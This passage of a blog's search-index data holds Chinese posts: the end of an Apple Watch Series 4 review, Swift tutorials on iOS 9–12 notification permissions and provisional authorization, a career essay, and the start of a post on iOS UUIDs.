重壓Icon手機除了發出聲響之外還會發出閃光燈p.s 反過來手機要找手錶則無此功能，若是遺失要找請從「尋找iPhone」中尋找訊息輸入無法辨識手寫中文字、語音也聽無中文覺得這是Bug…在訊息中重壓「麥克風」或「手寫」Icon 呼出選單&gt;「選擇語言」-&gt;「中文」另一方法是，打開「iPhone」-&gt;「設定」-&gt;「一般」-&gt;「鍵盤」-&gt;「聽寫」-&gt;「聽寫語言」-&gt;只勾「國語」這樣你的語音輸入就只聽得懂國語了，手機部分一併受到影響關閉深呼吸提醒／關閉站立提醒打開「iPhone」上的「Watch」 APP -&gt;「我的手錶」頁-&gt;呼吸-&gt;關閉呼吸提醒打開「iPhone」上的「Watch」 APP -&gt;「我的手錶」頁-&gt;活動紀錄-&gt;關閉站立提醒手錶想設定更複雜的密碼打開「iPhone」上的「Watch」 APP -&gt;「我的手錶」頁-&gt;密碼-&gt;簡易密碼-&gt;關閉-&gt;則可設定6位數密碼電話進來手錶能顯示Whoscall資訊嗎？不行。會頓嗎？實際與同事的Apple Watch S3相比，S4 開啟APP幾乎不用Loading、開機也很快實測可參考這部影片： 【最新】4代 Apple Watch Series 4 速度實測 音量比較耗電嗎？我的配戴時間只有起床～洗澡前，睡覺不戴（床靠牆怕無意識時敲到牆壁），洗澡前拆下來充電 晚上12點充滿電拆下放著，隔天早上8點大約剩下95% 晚上12點充滿電拆下放著， 切換飛航模式 ，隔天早上8點大約剩下98%一整天下來約配戴15小時，沒刻意一直玩的話大約剩下65%電量，很能撐，勉強可以兩天一充．*第一次充電可能需要較長時間*前幾天電池效能可能還沒發揮會較耗電實用APP推薦1. 在意空氣 (免費)：支援錶盤複雜功能AQI資訊2. 秒速記帳 ($60)：快速記帳軟體、支援錶盤複雜功能，有試過這套跟C*Money，但C*Money 要$120 而且供介面太過複雜，個人用不上手；所以比較推薦這款3. Bus+ (免費)：查詢公車資訊，原本使用的是台北等公車但該APP不支援Apple Watch，只好忍痛捨棄；Bus+與台北等公車邏輯有所不同，Bus+是以站為基礎，這邊個人的設定方法是；分常用的地點（家裏/公司/捷運站）再把有經過的公車路線加入Bus+4. Nike+ Run Club (免費)：跑步記錄APP5. Shazam (免費)：按一下辨識音樂（雖然直接問Siri也可以），還有另一款soundhound，個人實測是Shazam比較快6. 雙北市Ubike+ (免費)：查看鄰近的/收藏的Ubike站可借跟可停數量7. 錄音機 (免費)：快速使用Apple Watch錄音、傳輸到手機8. 倒數日 (免費)：查看紀念日／未來事件倒數9. Advanced Calculator For Apple Watch OS (免費)：在Apple Watch上使用小計算機Line,Spotify….e.t.c總結及使用一週心得佩戴至今快滿兩週，從原本很新奇的心情到現在已經平淡地融入到生活；到目前為止對生活有感的幫助：解鎖MAC我不用在打冗長的密碼(公司規定離開座位要登出)、即時查看天氣狀況、看看導航、APP通知、看看心律關心一下健康，差不多就如此而已；支援的APP及功能實在太少．使用手機的時間有減少？沒有特別感覺 ，因為收到通知我還是習慣用手機回，手錶回要用語音…在大庭廣眾下…用手寫的又非常慢；再者許多APP是不支援Apple Watch的動輒$12,900起跳真的值得嗎？破萬的手錶有更多很好的選擇，但要連動頻果全家桶就只有一個；如果你只是想單純買隻名錶那大可不必使用Apple Watch；如果你想要能解決日常瑣碎的手錶可以考慮；如果你想要奢侈品+解決日常瑣碎可以考慮不鏽鋼甚至是Hermès版！購買至今曾經有想退掉的念頭，總覺得$17,500能做很多事，花在一隻手錶上好像不太值得，但他的確又對日常生活是有幫助的，這個幫助值不值$17,500呢？我覺得目前不值，等Apple Watch APP生態系更有規模一點再來評估了，目前就是奢侈品XD，因為爽、潮、衝動所以買．其他項目就等大家自行體會囉-[最新] Apple Watch Series 6 開箱＆使用兩年體驗心得 &gt;&gt;&gt;點我前往手錶都買了，不考慮AirPods 2耳機嗎？請看下一篇&gt;&gt; AirPods 2 開箱及上手體驗心得自己的Apple Watch App 自己開發：請看 動手做一支 Apple Watch App 吧！(Swift)想在手錶控制智慧家電？請看 智慧家居初體驗 — Apple HomeKit &amp; 小米米家使用三個月後心得:詳細請看 這篇1.滿版貼做家事時撞到破了換了一次(吐血)2.增購了一副皮製錶帶：nomad Apple Watch 錶帶有任何問題及指教歡迎 與我聯絡 。本文首次發表於 Medium ➡️ 前往查看由 ZMediumToMarkdown 與 Medium-to-jekyll-starter 提供自動轉換與同步技術。Improve this page on Github.Follow Me on Medium 1K+ Followers 20,257 Total Views Last Statistics Date: 2025-08-15 | 20,243 Views on Medium." }, { "title": "iOS ≥ 12 在使用者的「設定」中增加「APP通知設定頁」捷徑 (Swift)", "url": "/posts/zrealm-dev/ios-12-%E5%9C%A8%E4%BD%BF%E7%94%A8%E8%80%85%E7%9A%84-%E8%A8%AD%E5%AE%9A-%E4%B8%AD%E5%A2%9E%E5%8A%A0-app%E9%80%9A%E7%9F%A5%E8%A8%AD%E5%AE%9A%E9%A0%81-%E6%8D%B7%E5%BE%91-swift-f644db1bb8bf/", "categories": "ZRealm Dev.", "tags": "ios-app-development, ios, swift, push-notification, ios-12", "date": "2018-11-12 22:38:42 +0800", "snippet": "iOS ≥ 12 在使用者的「設定」中增加「APP通知設定頁」捷徑 (Swift)除了從系統關閉通知，讓使用者還有其他選擇緊接著前三篇文章： iOS ≥ 10 Notification Service Extension 應用 (Swift) 什麼？iOS 12 不需使用者授權就能傳送推播通知(Swift) 從 iOS 9 到 iOS 12 推播通知權限狀態處理(Swift)我們繼續針...", "content": "iOS ≥ 12 在使用者的「設定」中增加「APP通知設定頁」捷徑 (Swift)除了從系統關閉通知，讓使用者還有其他選擇緊接著前三篇文章： iOS ≥ 10 Notification Service Extension 應用 (Swift) 什麼？iOS 12 不需使用者授權就能傳送推播通知(Swift) 從 iOS 9 到 iOS 12 推播通知權限狀態處理(Swift)我們繼續針對推播進行改進，不管是原有的技術或是新開放的功能，都來嘗試嘗試！這次是啥？iOS ≥ 12 可以在使用者的「設定」中增加您的APP通知設定頁面捷徑，讓使用者想要調整通知時，能有其他選擇；可以跳轉到「APP內」而不是從「系統面」直接關閉，ㄧ樣不囉唆先上圖：「設定」-&gt;「APP」-&gt;「通知」-&gt;「在APP中設定」另外在使用者收到通知時，若欲使用3D Touch調整設定「關閉」通知，會多一個「在APP中設定」的選項供使用者選擇「通知」-&gt;「3D Touch」-&gt;「…」-&gt;「關閉…」-&gt;「在APP中設定」怎麼實作？這部分的實作非常簡單，第一步僅需在要求推播權限時多要求一個 .providesAppNotificationSettings 權限即可//appDelegate.swift didFinishLaunchingWithOptions or....if #available(iOS 12.0, *) { let center = UNUserNotificationCenter.current() let permissiones:UNAuthorizationOptions = [.badge, .alert, .sound, .provisional,.providesAppNotificationSettings] center.requestAuthorization(options: permissiones) { (granted, error) in }}在詢問過使用者要不要允許通知之後，通知若為開啟狀態下方就會出現選項囉（ 不論前面使用者按允許或不允許 ）。第二步：第二步，也是最後一步；我們要讓 appDelegate 遵守 UNUserNotificationCenterDelegate 代理並實作 userNotificationCenter( _ center: UNUserNotificationCenter, openSettingsFor notification: UNNotification?) 方法即可！//appDelegate.swiftimport UserNotifications@UIApplicationMainclass AppDelegate: UIResponder, UIApplicationDelegate { var window: UIWindow? func application(_ application: UIApplication, didFinishLaunchingWithOptions launchOptions: [UIApplicationLaunchOptionsKey: Any]?) -&gt; Bool { if #available(iOS 10.0, *) { UNUserNotificationCenter.current().delegate = self } return true } //其他部份省略...}extension AppDelegate: UNUserNotificationCenterDelegate { @available(iOS 10.0, *) func userNotificationCenter(_ center: UNUserNotificationCenter, openSettingsFor notification: UNNotification?) { //跳轉到你的設定頁面位置.. //EX: //let VC = SettingViewController(); //self.window?.rootViewController.present(alertController, animated: true) }} 在Appdelegate的didFinishLaunchingWithOptions中實現代理 Appdelegate遵守代理並實作方法完成！相較於前幾篇文章，這個功能實作相較起來非常簡單 🏆總結這個功能跟 前一篇 提到的先不用使用者授權就發干擾性較低的靜音推播給使用者試試水溫有點類似！都是在開發者與使用者之前架起新的橋樑，以往APP太吵，我們會直接進到設定頁無情地關閉所有通知，但這樣對開發者來說，以後不管好的壞的有用的…任何通知都無法再發給使用者，使用者可能也因此錯過重要消息或限定優惠．這個功能讓使用者欲關閉通知時能有進到APP調整通知的選擇，開發者可以針對推播項目細分，讓使用者決定自己想要收到什麼類型的推播。以 結婚吧APP 來說，使用者若覺得專欄通知太干擾，可個別關閉；但依然能收到重要系統消息通知． p.s 個別關閉通知功能是我們APP本來就有的功能，但透過結合iOS ≥12的新通知特性能有更好的效果及使用者體驗的提升有任何問題及指教歡迎 與我聯絡 。本文首次發表於 Medium ➡️ 前往查看由 ZMediumToMarkdown 與 Medium-to-jekyll-starter 提供自動轉換與同步技術。Improve this page on Github.Follow Me on Medium 1K+ Followers 1,864 Total Views Last Statistics Date: 2025-08-15 | 1,640 Views on Medium." }, { "title": "永遠保持探索新事物的熱忱", "url": "/posts/zrealm-life/%E6%B0%B8%E9%81%A0%E4%BF%9D%E6%8C%81%E6%8E%A2%E7%B4%A2%E6%96%B0%E4%BA%8B%E7%89%A9%E7%9A%84%E7%86%B1%E5%BF%B1-8d863bcd1c55/", "categories": "ZRealm Life.", "tags": "ios-app-development, back-end-development, life-lessons, 生活, medium", "date": "2018-11-04 02:54:07 +0800", "snippet": "永遠保持探索新事物的熱忱從踏入資訊領域到轉戰iOS APP開發的人生契機Bangkok 2018 - Z Realm — 解決問題的道路上你並不孤單時間過得真快，從Back End轉跳開發Mobile iOS APP 滿一年、開始寫Medium也滿一個月，第10篇小小小里程碑就容我寫一篇自我突破轉換跑道心得。永遠保持探索新事物的熱忱「探索的本能促使人類偉大的成就」從古代哥倫布探索海洋發現新大...", "content": "永遠保持探索新事物的熱忱從踏入資訊領域到轉戰iOS APP開發的人生契機Bangkok 2018 - Z Realm — 解決問題的道路上你並不孤單時間過得真快，從Back End轉跳開發Mobile iOS APP 滿一年、開始寫Medium也滿一個月，第10篇小小小里程碑就容我寫一篇自我突破轉換跑道心得。永遠保持探索新事物的熱忱「探索的本能促使人類偉大的成就」從古代哥倫布探索海洋發現新大陸、萊特兄弟改良飛機征服天空到現在離開地球探索外太空；唯有對新事物充滿熱忱才能不斷地超越自己，或許我們不能像阿姆斯壯偉大，但是如同他所說的「你的一小步，可能是人的一大步」不要低估自己的創造力才能．契機機會來的時候要好好把握，因為不能保證會有第二次；你可能會猶豫或許下一個更好或懼怕下了錯誤的決定，但是「Who know s ? 是太陽先升起還是意外先來臨 」如果沒有負面的影響那就張開雙手握住機會吧！時間退回到2009年，剛進入彰工綜合高中就讀高一的我，在一次偶然的機會下得知學校有在培訓選手去參加比賽，當初的想法是「反正回家也沒事不如去學學東西」就去報名加入了；是我人生的第一個轉捩點，就此踏入資訊領域；加入選手培訓很辛苦，每天下課+六日+寒暑假三年的時間都在學校練習、風險也很高，沒比到名次就幾乎什麼都沒有；但就結果來說還好當時有把握住這個契機（選手一路走來的心路歷程以後再補上）全國技能競賽 - 勞動部勞動力發展署這個契機讓我學到了很多吃飯的技術，設計的illustrator/Photoshop/Flash、工程的PHP/Mysql/Html/CSS/Javascript/Jquery，並藉由比賽冠軍資格保送臺科大就讀；回頭來看，真的好險，好險有把握這個機會！時間快轉到2017年大學畢業依然是以後端工程師的職務進入職場，對於做網頁這件事，大學開始主要專精於做後端(Laravel)，前端的部分就沒什麼在研究了，都使用現成框架(Bootstrap/Semantic UI)這時的瓶頸是在同個領域太久且一直沒有突破性的發展，所以當初給自己下了新的目標： 繼續深入探索後端 轉換行銷(GA)/企劃領域 學新語言/寫APP這時候契機又出現，我加入的專案要開始開發移動平台應用；但起初我的設定是我去寫API後端，用Laravel加一些新技術對我也算是種突破；這邊要提到一件事，做決定時要把眼光放遠，當初預設選擇繼續後端的原因是惰性加上我覺得踏入的成本很高，因為那時沒有Mac再加上是一個全新的領域，還好有主管的提點，最終還是選擇踏入iOS APP開發．2018年的現在，開發iOS APP剛好滿一年，收穫的部分：學習了新的語言Swift、iOS APP開發、自己寫的APP上架的成就感、開始寫Medium?；還好有把握住這個機會，等於為我的職涯又開了另一扇窗！For工程的後端轉戰iOS APP開發的心得「都是寫程式不都差不多？」隔行如隔山…初期有人指點會比較快，因為很多觀念都跟網頁開發不太ㄧ樣，會經歷一陣子的撞牆期，要撐住！就能看到成功的曙光！我自己也撞牆了快一個月，稍微有脈絡之後你會遇到 第二次撞牆期 ，這時候要越挫越勇，從錯誤中學習，用時間換經驗（如果你時間不夠建議去上入門課或找個師傅帶你） 開發環境 ：以往寫PHP我們用Sublime打一打，Ctrl+S然後Ctrl+Tab切換到瀏覽器Ctrl+R就能快速看到結果；現在要使用Xcode，然後部署到模擬器或手機上才看得到結果；這部分正好能改善我急性子的個性XD． 語言部分 ：Swift比較Morden、強型別、更有結構，一開始可能不太習慣，但用上手後就沒什麼問題了 Storyboard/Interface Builder ：這部分降低新手的入門門檻，如果一開始就要用code刻畫面學習起來會更辛苦；可以直接視覺化玩轉UI、學習排版、拉拉Outlet 記憶體跟頁面排版結構 ：這是比較需要注意的項目，也是我說用時間換經驗的部分；以往做網頁沒有什麼極限，要做什麼就做什麼；就以表格來說，網頁就打&lt;table&gt;然後跑PHP迴圈把資料顯示出來，但在APP上就要使用UITableview元件來實作（想當初用UIView排出來然後很高興跟主管說我做好了！結果發現記憶體一個大爆炸）其他還有記憶體洩漏的部分也要多注意！ 應用上線 ：APP開發要更小心、測試要更細心；因為不像網頁能有錯就改，iOS APP上版本要經過審核、有BUG也不能降版，所以有BUG至少要花一天才能修復，對使用者影響很大！ 使用者評論 ：使用者可給你最直接的評論五顆星暖心、一顆心痛心總結@returntothesources人生就是充滿不確定性才有趣，對於來到的機會，你選擇把握就會有所收穫；你選擇放手，下個機會或許更好，沒有什麼對或錯，總之相信自己的直覺「擇你所愛，愛你所擇」給自己的期許目前還很菜會持續在iOS APP開發上打滾，朝著未來學習、成長尋找突破點、保持寫Medium的習慣，下一個契機是什麼？我也很期待！有任何問題及指教歡迎 與我聯絡 。本文首次發表於 Medium ➡️ 前往查看由 ZMediumToMarkdown 與 Medium-to-jekyll-starter 提供自動轉換與同步技術。Improve this page on Github.Follow Me on Medium 1K+ Followers 980 Total Views Last Statistics Date: 2025-08-15 | 971 Views on Medium." }, { "title": "從 iOS 9 到 iOS 12 推播通知權限狀態處理(Swift)", "url": "/posts/zrealm-dev/%E5%BE%9E-ios-9-%E5%88%B0-ios-12-%E6%8E%A8%E6%92%AD%E9%80%9A%E7%9F%A5%E6%AC%8A%E9%99%90%E7%8B%80%E6%85%8B%E8%99%95%E7%90%86-swift-fd7f92d52baa/", "categories": "ZRealm Dev.", "tags": "ios, push-notification, observables, ios-app-development, swift", "date": "2018-11-02 23:23:44 +0800", "snippet": "從 iOS 9 到 iOS 12 推播通知權限狀態處理(Swift)適配 iOS 9 ~ iOS 12 處理通知權限狀態及要求權限的解決方案做什麼？接續前一篇「 什麼？iOS 12 不需使用者授權就能傳送推播通知(Swift) 」提到的推播權限取得流程優化，經過上一篇Murmur部分寫的優化之後又遇到了新的需求： 使用者若關閉通知功能，我們能在特定功能頁面提示他去設定開啟 跳轉至設定頁後...", "content": "從 iOS 9 到 iOS 12 推播通知權限狀態處理(Swift)適配 iOS 9 ~ iOS 12 處理通知權限狀態及要求權限的解決方案做什麼？接續前一篇「 什麼？iOS 12 不需使用者授權就能傳送推播通知(Swift) 」提到的推播權限取得流程優化，經過上一篇Murmur部分寫的優化之後又遇到了新的需求： 使用者若關閉通知功能，我們能在特定功能頁面提示他去設定開啟 跳轉至設定頁後，若有打開/關閉通知的操作，回到APP要能跟著更改狀態 沒詢問過推播權限時詢問權限，有詢問過但是不允許則跳提示，有詢問過又是允許則能繼續操作 iOS 9 ~ iOS 12 都要支援1~3 都還好，使用 iOS 10 之後的Framework UserNotifications 差不多都能妥善的解決，麻煩的是第4項 要能支援 iOS 9，iOS 9要使用 registerUserNotificationSettings 舊的方式處理起來並不容易；就讓我們一步一步做起吧！思路及架構：首先宣告一個全域的 notificationStatus物件 儲存通知權限狀態 並在需要處理的頁面加上屬性監聽（這邊我使用 Observable 做屬性變化的訂閱、可自行找適合的KVO或用Rx、ReactiveCocoa）並在 appDelegate 中 didFinishLaunchingWithOptions (APP初始打開時)、applicationDidBecomeActive (從背景狀態回復時)、didRegisterUserNotificationSettings (≤iOS 9 的推播詢問處理) 這些方法中處理檢查推播通知權限狀態並更改 notificationStatus 的值需要做處理的頁面就會觸發並作相對應的處理（EX: 跳出通知被關閉提示）1. 首先宣告全域 notificationStatus 物件enum NotificationStatusType { case authorized case denied case notDetermined}var notificationStatus: Observable&lt;NotificationStatusType?&gt; = Observable(nil)notificationStatus/NotificationStatusType 的四種狀態分別對應： nil = 物件初始化…檢測中… notDetermined = 未詢問過使用者要不要接收通知 authorized = 已詢問過使用者要不要接收通知且按「允許」 denied = 已詢問過使用者要不要接收通知且按「不允許」2. 構建檢測通知權限狀態的方法：func checkNotificationPermissionStatus() { if #available(iOS 10.0, *) { UNUserNotificationCenter.current().getNotificationSettings { (settings) in DispatchQueue.main.async { //注意！要切回主執行緒 if settings.authorizationStatus == .authorized { //允許 notificationStatus.value = NotificationStatusType.authorized } else if settings.authorizationStatus == .denied { //不允許 notificationStatus.value = NotificationStatusType.denied } else { //沒問過 notificationStatus.value = NotificationStatusType.notDetermined } } } } else { if UIApplication.shared.currentUserNotificationSettings?.types == [] { if let iOS9NotificationIsDetermined = UserDefaults.standard.object(forKey: \"iOS9NotificationIsDetermined\") as? Bool,iOS9NotificationIsDetermined == true { //沒問過 notificationStatus.value = NotificationStatusType.notDetermined } else { //不允許 notificationStatus.value = NotificationStatusType.denied } } else { //允許 notificationStatus.value = NotificationStatusType.authorized } }}以上還沒結束！ 眼尖的朋友應該在≤ iOS 9的判斷之中發現”iOS9NotificationIsDetermined”這個自訂的UserDefaults，那它是用來幹嘛的呢？主因是≤iOS 9的檢測推播權限方法只能用獲取目前的權限有哪些作為判斷，若為空則代表無權限，但在沒詢問過權限的情況下也是會是空白；這時候麻煩就來了，使用者究竟是沒問過還是問過按不允許？這邊我使用了一個自訂的UserDefaults iOS9NotificationIsDetermined作為判斷開關，並在appDelegate的didRegisterUserNotificationSettings中加入：//appdelegate.swift:func application(_ application: UIApplication, didRegister notificationSettings: UIUserNotificationSettings) { //iOS 9(含)以下，跳出詢問要不要允許通知的視窗後，按下允許或不允許都會觸發這個方法 UserDefaults.standard.set(\"iOS9NotificationIsDetermined\", true) checkNotificationPermissionStatus()}通知權限狀態的物件、檢測的方法都構建好後，appDelegate裡我們還要再加上…//appdelegate.swiftfunc application(_ application: UIApplication, didFinishLaunchingWithOptions launchOptions: [UIApplicationLaunchOptionsKey: Any]?) -&gt; Bool { checkNotificationPermissionStatus() return true}func applicationDidBecomeActive(_ application: UIApplication) { checkNotificationPermissionStatus()}APP初始跟從背景返回都要再檢測一次推播狀態如何以上就是檢測的部分，再來我們來看如果是未詢問該怎麼處理要求通知權限3. 要求通知權限：func requestNotificationPermission() { if #available(iOS 10.0, *) { let permissiones:UNAuthorizationOptions = [.badge, .alert, .sound] UNUserNotificationCenter.current().requestAuthorization(options: permissiones) { (granted, error) in DispatchQueue.main.async { checkNotificationPermissionStatus() } } } else { application.registerUserNotificationSettings(UIUserNotificationSettings(types: [.alert, .badge, .sound], categories: nil)) //前面appdelegate.swift的didRegisterUserNotificationSettings會處理後續callback }}檢測跟要求都處理完囉，我們來看看如何應用4. 應用(靜態)if notificationStatus.value == NotificationStatusType.authorized { //OK!} else if notificationStatus.value == NotificationStatusType.denied { //不允許 //這邊範例是跳出UIAlertController提示並點擊後可跳轉至設定頁面 let alertController = UIAlertController( title: \"親愛的，您目前無法接收通知\", message: \"請開啟結婚吧通知權限。\", preferredStyle: .alert) let settingAction = UIAlertAction( title: \"前往設定\", style: .destructive, handler: { (action: UIAlertAction!) -&gt; Void in if let bundleID = Bundle.main.bundleIdentifier,let url = URL(string:UIApplicationOpenSettingsURLString + bundleID) { UIApplication.shared.openURL(url) } }) let okAction = UIAlertAction( title: \"取消\", style: .default, handler: { (action: UIAlertAction!) -&gt; Void in //well.... }) alertController.addAction(okAction) alertController.addAction(settingAction) self.present(alertController, animated: true) { }} else if notificationStatus.value == NotificationStatusType.notDetermined { //未詢問 requestNotificationPermission()} 請注意！！跳到APP的「設定」頁時請勿使用 UIApplication.shared.openURL(URL(string:”App-Prefs:root=\\ (bundleID)”) ) 方式跳轉， 會被退審! 會被退審! 會被退審! （親身經歷） 這是Private API5. 應用(動態)動態變更狀態的部分，因為notificationStatus物件我們使用是Observable，我們可以在要時時監測狀態的viewDidLoad中加入監聽處理：override func viewDidLoad() { super.viewDidLoad() notificationStatus.afterChange += { oldStatus,newStatus in if newStatus == NotificationStatusType.authorized { //print(\"❤️謝謝你打開通知\") } else if newStatus == NotificationStatusType.denied { //print(\"😭嗚嗚\") } }} 以上只是範例Code，實際應用、觸發可再自行調校 *notificationStatus 使用 Observable 請注意記憶體控制，該釋放時要能釋放（防止記憶體洩漏）、不該釋放時需持有（避免監聽失效）最後附上完整Demo成品：結婚吧APP*由於我們的專案支援範圍是iOS 9 ~ iOS12，iOS 8未進行任何測試不確定支援程度有任何問題及指教歡迎 與我聯絡 。本文首次發表於 Medium ➡️ 前往查看由 ZMediumToMarkdown 與 Medium-to-jekyll-starter 提供自動轉換與同步技術。Improve this page on Github.Follow Me on Medium 1K+ Followers 2,719 Total Views Last Statistics Date: 2025-08-15 | 2,626 Views on Medium." }, { "title": "什麼？iOS 12 不需使用者授權就能收到推播通知(Swift)", "url": "/posts/zrealm-dev/%E4%BB%80%E9%BA%BC-ios-12-%E4%B8%8D%E9%9C%80%E4%BD%BF%E7%94%A8%E8%80%85%E6%8E%88%E6%AC%8A%E5%B0%B1%E8%83%BD%E6%94%B6%E5%88%B0%E6%8E%A8%E6%92%AD%E9%80%9A%E7%9F%A5-swift-ade9e745a4bf/", "categories": "ZRealm Dev.", "tags": "ios, swift, push-notification, ios-app-development, ios12", "date": "2018-11-01 23:35:02 +0800", "snippet": "什麼？iOS 12 不需使用者授權就能傳送推播通知(Swift) — (2019–02–06 更新)UserNotifications Provisional Authorization 臨時權限、iOS 12 靜音通知介紹MurMur……前陣子在改善APP推播通知允許及點擊率過低問題，做了些優化調整；最初版的時候體驗非常差，APP 安裝完一啟動就直接跳「APP想要傳送通知」的詢問視窗；想當...", "content": "什麼？iOS 12 不需使用者授權就能傳送推播通知(Swift) — (2019–02–06 更新)UserNotifications Provisional Authorization 臨時權限、iOS 12 靜音通知介紹MurMur……前陣子在改善APP推播通知允許及點擊率過低問題，做了些優化調整；最初版的時候體驗非常差，APP 安裝完一啟動就直接跳「APP想要傳送通知」的詢問視窗；想當然而關閉率非常高，根據前一篇使用 Notification Service Extension 統計通知實際顯示數，推測按允許推播的使用者只有大約10%．目前調整新安裝引導流程、配合介面優化將詢問通知視窗的跳出時機調整如下：結婚吧APP如果使用者還在猶豫或想使用看看再決定要不要接收通知，可按右上角「略過」，避免一開始因對APP還不熟悉而按下「不允許」造成之後也無法再詢問一去不復返的結果。進入正題在做上面這個優化項目時發現 UserNotifications iOS 12 中新增一項 .provisional 權限，翻成白話就是臨時的通知權限， 不用跳詢問通知視窗取得允許通知權限就能對使用者發送推播通知(靜音通知) ，實際效果跟限制我們接著看下去。如何要求臨時通知權限?if #available(iOS 12.0, *) { let center = UNUserNotificationCenter.current() let permissiones:UNAuthorizationOptions = [.badge, .alert, .sound, .provisional] // 可以只要求臨時權限.provisional，或是順便先要求所有要用的權限ＸＤ // 都不會觸發顯示詢問通知視窗 center.requestAuthorization(options: permissiones) { (granted, error) in print(granted) }}我們將以上程式加入 AppDelegate didFinishLaunchingWithOptions 然後開啟APP，就會發現沒有跳出詢問通知視窗；這時我們去 設定 查看 APP通知設定(圖一) 取得靜音通知權限我們就這樣默默地取得了靜音通知權限🏆在程式判斷當前推播通知權限的部分新增 authorizationStatus .provisional 項目 (僅iOS 12之後)：if #available(iOS 10.0, *) { UNUserNotificationCenter.current().getNotificationSettings { (settings) in if settings.authorizationStatus == .authorized { //允許 } else if settings.authorizationStatus == .denied { //不允許 } else if settings.authorizationStatus == .notDetermined { //沒問過 } else if #available(iOS 12.0, *) { if settings.authorizationStatus == .provisional { //目前是臨時權限 } } }} 請注意！ 如果你有針對當前通知權限狀態做判斷， settings.authorizationStatus == .notDetermined 跟 settings.authorizationStatus == .provisional 都是可以再跳出通知詢問視窗問使用者允不允許接收通知的靜音通知能幹嘛？推播如何顯示？先來張圖整理一下靜音通知會顯示的時機：可以看到如果是靜音推播通知，APP在背景狀態下收到通知時 不會跳出橫幅、不會有聲音提示、不能標記、不會出現在鎖定畫面，只會出現在手機解鎖狀態下下拉的通知中心之中 ：可以看到您的發送的推播通知，並且會自動聚合成一個分類點擊展開後使用者可選擇：此展開的詢問視窗只會出現在「臨時權限」時靜音推播之下 要「繼續」接收推播 — 「傳送重要通知」： 通知權限就全開了！通知權限就全開了！通知權限就全開了！ 真的很重要所以講三次，這時候前面程式碼要求權限那段一併要求所有權限的效果就相當顯著了。或維持接收靜音通知 「關閉」 — 「關閉所有通知」點擊後完全關閉推播通知（含靜音通知）。附註：要怎麼手動把現有的APP調成靜音通知？靜音通知是iOS 12對通知優化推出的新設定與臨時權限無關，只不過是程式那端拿到臨時權限就能發靜音通知；針對APP的通知要設成靜音也很簡單，方法之一就是去「設定」-「通知」- 找到APP 將其所有權限都關閉只留「通知中心」(如圖ㄧ)即是靜音通知．或是收到APP通知時重壓/長壓展開後，點擊右上角「…」選擇傳送靜音通知亦同：有了臨時權限在之後觸發跳出詢問通知視窗時：要求通知權限的部分拿掉 .provisional 就能依然正常詢問使用者要不要允許接收通知：if #available(iOS 10.0, *) { let center = UNUserNotificationCenter.current() let permissiones:UNAuthorizationOptions = [.badge, .alert, .sound] center.requestAuthorization(options: permissiones) { (granted, error) in print(granted) }}按「允許」取得所有通知權限、按「不允許」關閉所有通知權限(含本來取得的靜音通知權限)整體流程如下：總結：iOS 12的這項通知貼心優化，讓使用者跟開發者之間對通知功能更容易達搭起互動的橋樑，能盡量避免一去不復返關閉通知的狀況。對使用者來說，往往跳詢問通知視窗時不知該按下允許還是拒絕因為我們不知道開發者會傳什麼樣的通知給我們，可能是廣告亦可能是重要消息，未知的事物是可怕的，所以大部分的人都會先保守按下拒絕。對開發者來說，我們精心準備了許多項目包含重要消息要推送給使用者知道，但就因上述問題而被使用者屏蔽，我們花費心思設計的文案就這樣白費了！此功能可讓開發者把握使用者剛安裝APP時的機會，設計好推播流程、內容，對使用者優先推送感興趣項目，增加使用者對此APP通知的認識度，並追蹤推播點擊率，在適當的時機再觸發詢問使用者要不要接收通知。雖然能曝光的地方只有 通知中心 但有曝光有機會；換個角度想，我們是使用者的話，沒按允許通知，APP如果能傳一堆有橫幅+有聲音+還出現在解鎖畫面的通知給我，應該會覺得非常干擾惱人(隔壁陣營就是XD)，蘋果這個做法則是在使用者與開發者之間取得了平衡。目前的問題大概就是….iOS 12的用戶還太少🤐延伸閱讀 從 iOS 9 到 iOS 12 推播通知權限狀態處理(Swift) iOS Deferred Deep Link 延遲深度連結實作(Swift) iOS+MacOS 使用mitmproxy 進行中間人嗅探 iOS 15 / MacOS Monterey Safari 將能隱藏真實 IP有任何問題及指教歡迎 與我聯絡 。本文首次發表於 Medium ➡️ 前往查看由 ZMediumToMarkdown 與 Medium-to-jekyll-starter 提供自動轉換與同步技術。Improve this page on Github.Follow Me on Medium 1K+ Followers 2,943 Total Views Last Statistics Date: 2025-08-15 | 2,925 Views on Medium." }, { "title": "iOS UUID 的那些事 (Swift/iOS ≥ 6)", "url": "/posts/zrealm-dev/ios-uuid-%E7%9A%84%E9%82%A3%E4%BA%9B%E4%BA%8B-swift-ios-6-a4bc3bce7513/", "categories": "ZRealm Dev.", "tags": "iplayground, swift, ios-app-development, uuid, idfv", "date": "2018-10-25 22:26:20 +0800", "snippet": "iOS UUID 的那些事 (Swift/iOS ≥ 6)iPlayground 2018 回來 &amp; UUID那些事前言：上週六、日跑去參加 iPlayground Apple 軟體開發者研討會，這個活動訊息是同事PASS過來的，去之前我也不清楚這個活動。兩天下來，整題活動跟時程安排流暢，議程內容： 趣味的：腳踏車、凋零的Code、iOS/API 演進史、威利在哪裡(CoreML ...", "content": "iOS UUID 的那些事 (Swift/iOS ≥ 6)iPlayground 2018 回來 &amp; UUID那些事前言：上週六、日跑去參加 iPlayground Apple 軟體開發者研討會，這個活動訊息是同事PASS過來的，去之前我也不清楚這個活動。兩天下來，整題活動跟時程安排流暢，議程內容： 趣味的：腳踏車、凋零的Code、iOS/API 演進史、威利在哪裡(CoreML Vision) 實用的：測試類 (XCUITest、依賴注入)、SpriteKit 做動畫效果的替代方案、GraphQL 真功夫：深入拆解Swift、iOS 越獄/Tweak開發、Redux腳踏車Project 印象深刻，用iPhone手機當感測器感測腳踏車踏板轉動，直接在台上騎腳踏車切換投影片(前輩主要目標是要做開源版zwift，也分享了許多地雷，例如Client/Sever通信、延遲問題、磁場干擾)凋零的Dirty Code；聽得心有戚戚，在心裡會心一笑；技術債就是這樣一直累積下來的，開發時程趕，所以用架構性較差的快速做法，後人接手改也沒時間重構，就越積越多；到最後可能真的只有打掉這條路了測試類(Design Patterns in XCUITest) KKBOX的前輩 ，完全沒藏私直接公開他們的作法及程式範例細節還有遇到的雷、解決辦法，這堂也是對我們工作上最有幫助的項目；測試這塊是我一直想加強的部分，可以回去好好研究研究Lighting Talk的部分在台下聽得也好想上去分享😂 下次要提早做好準備了!會後的offical 